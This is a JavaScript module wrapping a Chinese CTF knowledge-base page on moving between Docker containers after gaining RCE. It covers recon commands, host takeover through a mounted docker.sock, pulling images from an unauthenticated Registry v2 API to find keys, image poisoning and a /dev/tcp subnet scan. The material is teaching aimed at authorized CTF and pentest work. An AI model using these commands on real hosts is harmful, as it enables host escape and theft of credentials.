const n="Docker-Registry与远程API利用",r="Docker Registry 与远程 API 利用",e="容器环境题的标配：**拿到一个容器之后，真正的 flag 往往在另一个容器/内部服务里。** 这页讲容器间横向的三条主要路径。",o=`# Docker Registry 与远程 API 利用\r
\r
> 容器环境题的标配：**拿到一个容器之后，真正的 flag 往往在另一个容器/内部服务里。** 这页讲容器间横向的三条主要路径。\r
\r
## 一、先判断"我在哪"\r
\r
进入容器（webshell / RCE）后的第一组探针：\r
\r
| 命令 | 想知道什么 |\r
|---|---|\r
| \`id\` / \`whoami\` | 是不是 root、能不能提权 |\r
| \`hostname\` / \`cat /etc/hostname\` | 容器 ID（12 位）→ 后面查 Registry/IP 有用 |\r
| \`cat /proc/1/cmdline\` | 容器是干什么的 |\r
| \`env\` | 环境变量常含内部服务地址、DB 口令、密钥 |\r
| \`ip addr\` / \`cat /etc/hosts\` | 内网网段、其它服务的别名（**hosts 文件经常直接暴露内部服务名**） |\r
| \`cat /etc/resolv.conf\` | DNS 与网段线索 |\r
| \`ls -la /var/run/docker.sock\` | Docker Socket 有没有被挂进来（有 = 直接结束战斗） |\r
| \`mount\` / \`cat /proc/mounts\` | 有没有挂载宿主机目录 |\r
| \`netstat -anp\` / \`ss -lntp\` | 本机开了哪些端口 |\r
\r
## 二、路径 A：docker.sock 被挂载（最爽）\r
\r
\`/var/run/docker.sock\` 是 Docker daemon 的通信入口，挂进容器等于把宿主机控制权给了你。\r
\r
利用方式（本质是"让 daemon 干你想要的活"）：\r
\r
1. 装/拷一个 docker CLI（镜像里往往没有）\r
2. \`docker -H unix:///var/run/docker.sock ps\` 看宿主机上有哪些容器\r
3. \`docker -H ... images\` 看有哪些镜像\r
4. 起一个新容器把宿主机根目录挂进来：\r
   \`docker -H ... run -v /:/host -it <某镜像> chroot /host\`\r
5. 或直接对已有容器 \`docker exec\` 进去找 flag\r
\r
**没有 CLI 也能用**：直接对 socket 发 HTTP（\`curl --unix-socket /var/run/docker.sock http://localhost/containers/json\`）——这样连工具都不用装。\r
\r
## 三、路径 B：Docker Registry（v2 API）\r
\r
Registry 是镜像仓库，默认端口 **5000**。**它的默认配置常常没有认证**，也就是"能列、能拉"——而镜像里就有下一个容器的源码和密钥。\r
\r
### 1. 探测与探测顺序\r
\r
\`\`\`\r
GET /v2/                      → 200 = API 可用；401 = 需要认证\r
GET /v2/_catalog              → 列出仓库里所有镜像名（关键一步）\r
GET /v2/<name>/tags/list      → 列出某镜像的所有 tag\r
GET /v2/<name>/manifests/<tag>→ 拿到 manifest（含层 blob 的 digest）\r
GET /v2/<name>/blobs/<digest> → 下载层（tar.gz），解开就是文件系统\r
\`\`\`\r
\r
### 2. 从镜像里挖什么\r
\r
拉下来解开（\`tar -xzf\`），重点看：\r
\r
- **源码**：\`/app\`、\`/src\`、\`/opt\` 下的代码 → 读它怎么校验、密钥怎么来\r
- **配置与凭据**：\`.env\`、\`config.*\`、\`docker-compose.yml\`、SSL 证书与私钥\r
- **镜像历史**：\`GET /v2/<name>/manifests/<tag>\` 里若含 \`history\`，或解开层里的 \`/etc/\`、环境变量\r
- **构建痕迹**：删掉的文件可能仍在其它层里（**层是叠加的，前一层删掉不等于不存在**）\r
\r
> 挖层的顺序：先看 manifest → 再看 config blob（里面有 \`Env\`、\`Cmd\`、\`Entrypoint\`、\`WorkingDir\`）→ 再逐层解开找文件与"被删掉的残留"。\r
\r
### 3. 认证相关\r
\r
- 401 且带 \`WWW-Authenticate: Bearer realm=...,service=...\` → 去看那个 realm 的 token 接口，有的只要 \`scope\` 参数就给 token\r
- 有时匿名能 **pull** 但不能 **push**（push 权限 = 可以投毒镜像，属于更高阶玩法）\r
- 凭据可能来自环境变量 / 其它容器（→ [[Web-SSRF与XXE]] 或本页路径 A）\r
\r
### 4. 如果你能 push\r
\r
用 \`skopeo\` / \`crane\` / 手工 push 一层恶意镜像，等宿主/CI 去拉——这属于"投毒"路线，CTF 里较少，真实环境要格外注意授权边界。\r
\r
## 四、路径 C：内网服务直连\r
\r
同网段里常有别的容器（License 服务、数据库、cache）。做法：\r
\r
1. 扫段（\`for i in $(seq 1 254); do (echo >/dev/tcp/172.17.0.$i/80) 2>/dev/null && echo $i; done\`）\r
2. 用 [[Web-SSRF与XXE]] 的方式借服务端身份去请求（当自己出不了网时）\r
3. 找到服务后按协议打（HTTP/Redis/MySQL 各按各的打法）\r
\r
## 关键点\r
\r
\`\`\`\r
我拿到容器 A 的 RCE\r
  → 我在这台机器上还能看到什么？(env / hosts / mounts / socket / 网段)\r
  → 有没有别的容器？名字/端口是什么？\r
  → 那个服务的凭据在哪？(镜像里 / 环境变量里 / 配置文件里)\r
  → 用凭据或未授权 API 进入下一个容器\r
  → 重复\r
\`\`\`\r
\r
**卡住时最该做的不是换 payload，而是回到第一步重新看环境**——容器题的信息量几乎总比你以为的多。\r
\r
## 关联\r
\r
- [[CTF-竞赛总览与解题流程]] —— 链条思维\r
- [[Web-SSRF与XXE]] —— 借服务端身份打内网\r
- [[Web-源码泄露与信息收集]] —— 从镜像里挖源码\r
- [[Web-认证与会话漏洞]] —— 拿到凭据之后\r
- [[青岑-License授权管理系统]] —— 这类链条的一个实际例子（本机正在做的题）\r
- [[CTF-常用工具清单]]\r
\r
## 存疑 / 矛盾\r
\r
- "Registry 没认证就能拿 flag"是过度简化：**能拉镜像 ≠ 能读到 flag**，镜像里往往只有"下一步怎么走"的线索（密钥、格式、内部地址）。\r
- 本页所有手法仅用于**授权范围内的 CTF / 渗透测试**；对非授权目标操作是违法的。\r
\r
## 来源\r
\r
- 糯米内建知识整理 · 2026-10-03（无外部文件）\r
`,t="concept",s="other",c={internal:["CTF-常用工具清单","CTF-竞赛总览与解题流程","Web-SSRF与XXE","Web-源码泄露与信息收集","Web-认证与会话漏洞","青岑-License授权管理系统"],unresolvedCount:0},a={name:n,title:r,summary:e,content:o,section:t,group:s,links:c};export{o as content,a as default,s as group,c as links,n as name,t as section,e as summary,r as title};
